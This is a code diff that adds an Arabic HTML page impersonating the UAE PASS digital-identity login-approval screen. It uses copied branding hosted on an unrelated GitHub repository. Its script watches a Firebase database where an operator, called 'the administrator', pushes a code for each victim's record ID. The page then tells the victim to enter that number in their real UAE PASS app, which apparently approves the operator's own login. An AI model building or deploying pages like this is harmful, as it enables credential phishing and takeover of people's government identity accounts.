@@ -1,0 +1,883 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
+    
+    <!-- Bootstrap CSS من CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <!-- نحتاج فقط Realtime Database -->
+    <script src="firebase-config-prod.js?v=1"></script>
+    
+    <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
+    
+    <style>
+        /* CSS الأساسي */
+        body, html {
+            font-family: 'Dubai', 'Roboto', sans-serif !important;
+            background: #F9F9FB;
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+        
+        .main-container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .login-container {
+            max-width: 1280px;
+            margin: auto;
+            flex: 0 0 100%;
+        }
+
+        .login-container-fluid {
+            max-width: 100%;
+            height: 100%;
+        }
+
+        .header {
+            background: #fff;
+            height: 64px;
+            padding: 16px 0px;
+        }
+
+        .header-title {
+            color: #1B1B1F;
+            font-style: normal;
+            font-weight: 300;
+            line-height: 32px;
+            font-size: 22px;
+            padding: 0px 16px;
+        }
+
+        /* شاشة التحميل */
+        #loadingScreen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+            background: #F9F9FB;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 9999;
+        }
+        
+        .card {
+            margin: 48px 0px 10px 0px;
+        }
+
+        .card-info {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            word-wrap: break-word;
+            background-clip: border-box;
+            border-radius: 0.25rem;
+            margin: 48px 0px 10px 0px;
+            border: 0px !important;
+        }
+
+        .card.login {
+            padding: 48px;
+            margin: 48px 0px 10px 0px;
+            border: 1.6px solid transparent;
+            border-radius: 19px;
+            background-image: linear-gradient(to right bottom, white, white), radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);
+            background-origin: border-box;
+            background-clip: padding-box, border-box;
+        }
+
+        .card.login .card-header {
+            display: flex;
+            justify-content: space-between;
+            background: white;
+            border: 0;
+            padding: 0px;
+        }
+
+        .card.login .card-content {
+            display: flex;
+            flex-direction: row;
+            flex-grow: 1;
+            justify-content: space-between;
+        }
+
+        .card.login .card-content .card-content-left {
+            max-width: 70%;
+            padding-right: 40px;
+        }
+
+        .login-pin-image {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .info-title {
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        .info-app-name {
+            font-size: 16px;
+            font-style: normal;
+            font-weight: 400;
+            padding: 32px 0px;
+        }
+
+        .info-description {
+            font-size: 28px;
+            font-style: normal;
+            font-weight: 400;
+            line-height: 36px;
+            max-width: 500px;
+        }
+
+        @keyframes spin {
+            from {transform: translate(-50%, -50%) rotate(0);}
+            to   {transform: translate(-50%, -50%) rotate(360deg);}
+        }
+
+        .passcode-card {
+            color: #454F63;
+            width: 90px;
+            height: 90px;
+            margin: auto;
+            position: relative;
+            overflow: hidden;
+            border-radius: 16px;
+            display: inline-block;
+        }
+
+        .passcode-card::before {
+            content: '';
+            display: block;
+            background: conic-gradient(
+                #fff 0.0turn 0.125turn,
+                #fff 0.125turn 0.25turn,
+                #fff 0.25turn 0.375turn,
+                #fff 0.375turn 0.5turn,
+                #fff 0.5turn 0.625turn,
+                #fff 0.625turn 0.75turn,
+                #20644B 0.75turn 0.875turn,
+                #20644B 0.875turn 1.0turn
+            );
+            width: calc(100% * 1.41421356237);
+            padding-bottom: calc(100% * 1.41421356237);
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 100%;
+            animation: spin 5s linear infinite;
+        }
+
+        .passcode-card::after {
+            content: attr(data-after-content);
+            position: absolute;
+            inset: 0.15rem;
+            background: #ECF3EC;
+            border-radius: 0.85rem;
+            font-size: 52px;
+            font-style: normal;
+            font-weight: 400;
+            text-align: center;
+            line-height: 100px;
+        }
+
+        .uaepass-logo {
+            width: 32px;
+            object-fit: contain;
+            height: 32px;
+            padding: 6px
+        }
+
+        .uaepass-text-logo {
+            display: flex;
+            height: 41px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .timer-img {
+            width: 25px;
+            height: 20px;
+            padding: 1.667px 5.149px 2.415px 4.706px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .waiting-confirmation {
+            color: #C78200;
+            font-family: Roboto;
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 400;
+            line-height: normal;
+            padding-top: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .cancel-request {
+            color: #FF5545;
+            border: 0;
+            background: transparent;
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 500;
+            line-height: 24px;
+            cursor: pointer;
+        }
+
+        .cancel-request:after {
+            display: inline-block;
+            content: "\00d7";
+            font-size: 28px;
+            padding: 10px 0px;
+            font-weight: 400;
+        }
+
+        .polling-footer {
+            position: relative;
+            width: 100%;
+        }
+
+        .ids-logo {
+            width: 13px;
+            height: 13px;
+            object-fit: contain;
+            position: absolute;
+            margin-bottom: 1em;
+            margin-left: 5px;
+        }
+
+        .poweredby {
+            font-size: 1rem;
+            font-weight: 500;
+            line-height: 1.5;
+            text-align: center;
+            color: #454f63;
+        }
+
+        /* تنسيق إضافي للرقم المعروض */
+        .passcode-info {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            display: none;
+        }
+        
+        .main-content {
+            display: none;
+        }
+        
+        /* حالة الاتصال */
+        .connection-status {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 10000;
+        }
+        
+        /* CSS للإظهار والإخفاء حسب حجم الشاشة */
+        @media only screen and (min-width: 601px) {
+            .cancel-request-mobile,
+            .card-content-right-mobile {
+                display: none !important;
+            }
+            
+            .card-content-right {
+                display: block !important;
+            }
+            
+            .cancel-request-div {
+                display: block !important;
+            }
+        }
+
+        @media only screen and (max-width: 600px) {
+            .cancel-request-mobile {
+                display: block !important;
+                margin-top: 10px;
+            }
+            
+            .card-content-right-mobile {
+                display: block !important;
+            }
+            
+            .card-content-right {
+                display: none !important;
+            }
+            
+            .cancel-request-div {
+                display: none !important;
+            }
+            
+            .card-content-right-mobile {
+                margin-bottom: 30px;
+                text-align: center;
+            }
+            
+            .login-pin-image {
+                max-width: 200px !important;
+            }
+            
+            .card.login {
+                padding: 20px;
+            }
+            
+            .info-description {
+                font-size: 18px;
+                line-height: 1.5;
+            }
+        }
+
+        /* تأكد من إخفاء العناصر بشكل صحيح */
+        .card-content-right-mobile {
+            display: none;
+        }
+        
+        .card-content-right {
+            display: block;
+        }
+        
+        .cancel-request-mobile {
+            display: none;
+        }
+        
+        .cancel-request-div {
+            display: block;
+        }
+        
+        /* شريط تقدم */
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            background-color: #eee;
+            border-radius: 5px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .progress-text {
+            margin-top: 5px;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* رسائل الخطأ */
+        .error-message {
+            background-color: #ffebee;
+            border: 1px solid #ffcdd2;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .error-icon {
+            font-size: 48px;
+            color: #f44336;
+            margin-bottom: 15px;
+        }
+        
+        .retry-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- حالة الاتصال -->
+    <div class="connection-status" id="connectionStatus">
+        <i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...
+    </div>
+    
+    <div class="main-container">
+        <!-- شاشة التحميل -->
+        <div id="loadingScreen">
+            <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري الاتصال</h2>
+            <p style="color: #78849e;" id="loadingMessage">جاري التحضير...</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+            
+            <div id="firebaseStatus" style="margin-top: 20px; font-size: 14px; color: #666;">
+                <i class="fas fa-cloud"></i> جاري التحقق من اتصال قاعدة البيانات...
+            </div>
+            
+            <div id="errorContainer" style="display: none; margin-top: 20px;">
+                <div class="error-message">
+                    <div class="error-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <h4 id="errorTitle">خطأ في الاتصال</h4>
+                    <p id="errorMessage"></p>
+                    <button class="retry-button" onclick="retryConnection()">
+                        <i class="fas fa-redo"></i> إعادة المحاولة
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- المحتوى الرئيسي -->
+        <div class="main-content" id="mainContent">
+            <!-- Header Section -->
+            <div class="header-section">
+                <div class="login-container-fluid header">
+                    <div class="login-container flex">
+                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
+                        <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="login-container-fluid">
+                <div class="login-container">
+                    <form id="loginForm" action="../../commonauth" method="post"
+                          enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
+                        
+                        <!-- Hidden Inputs -->
+                        <input id="username" name="username" type="hidden" value="">
+                        <input id="cancelOnWeb" type="hidden" name="cancelOnWeb" value="">
+                        <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
+                        <input id="password" name="password" type="hidden" value="">
+                        <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='f9b79f82-8317-4f54-aa60-0cd566553e95' />
+                        
+                        <!-- New input for username from user -->
+                        <input type="hidden" id="usernameUserInput" name="usernameUserInput" value="">
+
+                        <!-- Login Card -->
+                        <div class="card login">
+                            <div class="card-header">
+                                <div>
+                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
+                                </div>
+                                <div class="cancel-request-div">
+                                    <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
+                                        إلغاء الطلب
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            <div class="card-content">
+                                <!-- Left Content -->
+                                <div class="card-content-left">
+                                    <div class="card-info">
+                                        <div class="info-title">
+                                            طلب تسجيل الدخول من
+                                        </div>
+                                        <div class="info-app-name">Self Service Portal</div>
+
+                                        <!-- Mobile Image -->
+                                        <div class="card-content-right-mobile">
+                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                        </div>
+
+                                        <div class="info-description">
+                                            <span>افتح تطبيق الهوية الرقمية الخاص بك، وأدخل الرقم الموضح لتسجيل الدخول</span>
+                                        </div>
+                                        
+                                        <!-- Passcode Display -->
+                                        <div class="card-info">
+                                            <div class="passcode-card" data-after-content="00" aria-label="الرمز" id="passcodeDisplay"></div>
+                                            <div class="passcode-info" id="passcodeInfo">
+                                                مصدر الرقم: <span id="numberSource">محلي</span>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Waiting Status -->
+                                        <div class="waiting-confirmation">
+                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
+                                            <span id="waitingText">في انتظار تأكيدك</span>
+                                        </div>
+
+                                        <!-- Mobile Cancel Button -->
+                                        <div class="cancel-request-mobile">
+                                            <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
+                                                إلغاء الطلب
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Desktop Image -->
+                                <div class="card-content-right">
+                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Footer -->
+                        <div class="polling-footer">
+                            <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
+                            <p class="poweredby"> Powered by UAE PASS </p>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+/* ================== متغيرات عامة ================== */
+let realtimeDb = null;
+let checkInterval = null;
+let currentRecordId = null;
+let connectionAttempts = 0;
+const MAX_CONNECTION_ATTEMPTS = 3;
+
+/* ================== دوال واجهة المستخدم ================== */
+function updateProgress(p, msg) {
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    
+    if (progressBar) {
+        progressBar.style.width = p + '%';
+        progressBar.style.backgroundColor = p < 50 ? '#ff9800' : p < 80 ? '#2196f3' : '#4CAF50';
+    }
+    
+    if (progressText) {
+        progressText.innerText = p + '%';
+    }
+    
+    if (msg) {
+        document.getElementById('loadingMessage').innerText = msg;
+    }
+}
+
+function updateConnection(text) {
+    const firebaseStatus = document.getElementById('firebaseStatus');
+    if (firebaseStatus) {
+        firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> ' + text;
+    }
+    
+    const connectionStatus = document.getElementById('connectionStatus');
+    if (connectionStatus) {
+        connectionStatus.innerHTML = text;
+    }
+}
+
+function showError(title, message) {
+    const errorContainer = document.getElementById('errorContainer');
+    const errorTitle = document.getElementById('errorTitle');
+    const errorMessage = document.getElementById('errorMessage');
+    
+    errorTitle.innerText = title;
+    errorMessage.innerText = message;
+    errorContainer.style.display = 'block';
+    
+    updateConnection('❌ ' + title);
+}
+
+function hideError() {
+    document.getElementById('errorContainer').style.display = 'none';
+}
+
+/* ================== تهيئة Firebase ================== */
+async function initializeFirebase() {
+    try {
+        console.log('🚀 جاري تهيئة Firebase للإنتاج...');
+        
+        // تفريغ محاولات الاتصال
+        connectionAttempts = 0;
+        
+        // إخفاء أي أخطاء سابقة
+        hideError();
+        
+        // تحديث التقدم
+        updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
+        updateConnection('جاري تهيئة Firebase...');
+        
+        // انتظار حتى يتم تحميل Firebase SDK
+        if (typeof firebase === 'undefined') {
+            throw new Error('Firebase SDK غير محمل');
+        }
+        
+        // التحقق من التهيئة
+        if (!firebase.apps.length) {
+            throw new Error('Firebase لم يتم تهيئته');
+        }
+        
+        // الحصول على نسخة من Realtime Database
+        realtimeDb = firebase.database();
+        
+        // اختبار الاتصال
+        updateProgress(40, 'جاري اختبار الاتصال بقاعدة البيانات...');
+        
+        // محاولة الاتصال بـ Realtime Database
+        const testRef = realtimeDb.ref('.info/connected');
+        
+        return new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                testRef.off();
+                reject(new Error('انتهت مهلة الاتصال بقاعدة البيانات'));
+            }, 10000);
+            
+            testRef.on('value', (snap) => {
+                clearTimeout(timeout);
+                testRef.off();
+                
+                if (snap.val() === true) {
+                    console.log('✅ متصل بـ Realtime Database بنجاح');
+                    updateProgress(60, 'تم الاتصال بقاعدة البيانات بنجاح');
+                    updateConnection('✅ متصل بقاعدة البيانات');
+                    resolve(true);
+                } else {
+                    reject(new Error('الاتصال بقاعدة البيانات غير متاح'));
+                }
+            }, (error) => {
+                clearTimeout(timeout);
+                reject(error);
+            });
+        });
+        
+    } catch (error) {
+        console.error('❌ خطأ في تهيئة Firebase:', error);
+        throw error;
+    }
+}
+
+/* ================== الاستماع لبيانات المصادقة ================== */
+function setupRealtimeListener(recordId) {
+    if (!recordId || !realtimeDb) {
+        console.error('❌ معرّف السجل غير صالح أو قاعدة البيانات غير مهيأة');
+        return;
+    }
+    
+    console.log('🔍 جاري الاستماع للسجل:', recordId);
+    
+    const ref = realtimeDb.ref(`user_auth_numbers/${recordId}`);
+    
+    // إعداد مستمع للبيانات
+    ref.on('value', (snap) => {
+        const data = snap.val();
+        
+        if (!data) {
+            console.log('📭 لا توجد بيانات للسجل:', recordId);
+            updateProgress(70, 'في انتظار بيانات المصادقة...');
+            updateConnection('⏳ في انتظار البيانات...');
+            return;
+        }
+        
+        console.log('📥 تم استلام البيانات:', data);
+        
+        if (data.status === 'waiting') {
+            updateProgress(80, 'الطلب قيد المراجعة من المسؤول...');
+            updateConnection('⏳ في انتظار موافقة المسؤول');
+            return;
+        }
+        
+        if (data.status === 'completed' && data.number !== undefined) {
+            console.log('✅ تم استلام رقم المصادقة:', data.number);
+            showAuthNumber(data.number);
+        }
+        
+        if (data.status === 'rejected') {
+            console.log('❌ تم رفض الطلب');
+            showError('تم رفض الطلب', 'تم رفض طلب المصادقة من قبل المسؤول');
+        }
+    }, (error) => {
+        console.error('❌ خطأ في الاستماع للبيانات:', error);
+        showError('خطأ في الاتصال', 'فقد الاتصال بقاعدة البيانات. جاري إعادة المحاولة...');
+        setTimeout(() => setupRealtimeListener(recordId), 3000);
+    });
+    
+    // إعداد مستمع لفقدان الاتصال
+    const connectionRef = realtimeDb.ref('.info/connected');
+    connectionRef.on('value', (snap) => {
+        if (snap.val() === true) {
+            console.log('✅ تمت إعادة الاتصال');
+            updateConnection('✅ متصل بقاعدة البيانات');
+            hideError();
+        } else {
+            console.log('⚠️ فقد الاتصال بالخادم');
+            updateConnection('⚠️ جاري إعادة الاتصال...');
+        }
+    });
+}
+
+/* ================== عرض رقم المصادقة ================== */
+function showAuthNumber(num) {
+    // تنظيف الفاصل الزمني للتقدم
+    if (checkInterval) {
+        clearInterval(checkInterval);
+        checkInterval = null;
+    }
+    
+    // تنسيق الرقم (إضافة صفر إذا كان أقل من 10)
+    const formatted = num < 10 ? '0' + num : num.toString();
+    
+    // تحديث عرض الرمز
+    const passcodeDisplay = document.getElementById('passcodeDisplay');
+    if (passcodeDisplay) {
+        passcodeDisplay.setAttribute('data-after-content', formatted);
+    }
+    
+    // تحديث حالة الاتصال
+    updateConnection('✅ تم استلام رقم المصادقة');
+    
+    // إخفاء شاشة التحميل وإظهار المحتوى الرئيسي
+    setTimeout(() => {
+        document.getElementById('loadingScreen').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+        updateProgress(100, 'جاهز للمصادقة');
+    }, 500);
+    
+    // إضافة أي تأثيرات إضافية هنا
+    console.log('🎉 تم عرض رقم المصادقة:', formatted);
+}
+
+/* ================== إعادة المحاولة ================== */
+function retryConnection() {
+    console.log('🔄 جاري إعادة المحاولة...');
+    start();
+}
+
+/* ================== إلغاء الطلب ================== */
+function cancel() {
+    if (confirm('هل تريد إلغاء طلب المصادقة؟')) {
+        window.location.href = 'index.html';
+    }
+}
+
+/* ================== بدء العملية ================== */
+async function start() {
+    try {
+        connectionAttempts++;
+        
+        // إخفاء المحتوى الرئيسي وإظهار شاشة التحميل
+        document.getElementById('mainContent').style.display = 'none';
+        document.getElementById('loadingScreen').style.display = 'flex';
+        
+        // إعادة تعيين شريط التقدم
+        updateProgress(10, 'جاري تحضير النظام...');
+        hideError();
+        
+        // الحصول على معرّف السجل من URL
+        const params = new URLSearchParams(window.location.search);
+        currentRecordId = params.get('recordId');
+        
+        if (!currentRecordId) {
+            throw new Error('❌ لم يتم العثور على معرّف السجل في الرابط');
+        }
+        
+        console.log('🔑 معرّف السجل:', currentRecordId);
+        
+        // تهيئة Firebase
+        updateProgress(30, 'جاري الاتصال بقاعدة البيانات...');
+        await initializeFirebase();
+        
+        // إعداد مستمع البيانات
+        updateProgress(70, 'جاري البحث عن رقم المصادقة...');
+        setupRealtimeListener(currentRecordId);
+        
+        // زيادة شريط التقدم تدريجياً أثناء الانتظار
+        checkInterval = setInterval(() => {
+            const progressBar = document.getElementById('progressBar');
+            if (progressBar) {
+                const currentWidth = parseInt(progressBar.style.width) || 70;
+                if (currentWidth < 95) {
+                    updateProgress(currentWidth + 1, 'جاري البحث عن رقم المصادقة...');
+                }
+            }
+        }, 2000);
+        
+        // مهلة زمنية للانتظار (10 دقائق)
+        setTimeout(() => {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+                showError('انتهت مهلة الانتظار', 'لم يتم استلام رقم المصادقة خلال الوقت المحدد.');
+            }
+        }, 10 * 60 * 1000); // 10 دقائق
+        
+    } catch (error) {
+        console.error('❌ خطأ في بدء العملية:', error);
+        
+        if (connectionAttempts < MAX_CONNECTION_ATTEMPTS) {
+            showError('خطأ في الاتصال', `${error.message}. جاري إعادة المحاولة (${connectionAttempts}/${MAX_CONNECTION_ATTEMPTS})...`);
+            setTimeout(retryConnection, 3000);
+        } else {
+            showError('فشل الاتصال', 'تعذر الاتصال بقاعدة البيانات بعد عدة محاولات. يرجى التحقق من اتصال الإنترنت والمحاولة لاحقاً.');
+        }
+    }
+}
+
+/* ================== بدء التشغيل عند تحميل الصفحة ================== */
+document.addEventListener('DOMContentLoaded', function() {
+    // بدء العملية بعد تحميل الصفحة
+    setTimeout(start, 500);
+});
+
+/* ================== إدارة اتصال Firebase ================== */
+// هذه الدالة تساعد في إعادة الاتصال التلقائي
+function manageFirebaseConnection() {
+    if (realtimeDb) {
+        const connectedRef = realtimeDb.ref('.info/connected');
+        connectedRef.on('value', (snap) => {
+            if (snap.val() === true) {
+                console.log('🌐 متصل بـ Firebase');
+                // إعادة إعداد المستمع إذا فقد الاتصال
+                if (currentRecordId) {
+                    setupRealtimeListener(currentRecordId);
+                }
+            } else {
+                console.log('⚠️ غير متصل بـ Firebase');
+            }
+        });
+    }
+}
+</script>
+
+</body>
+</html>
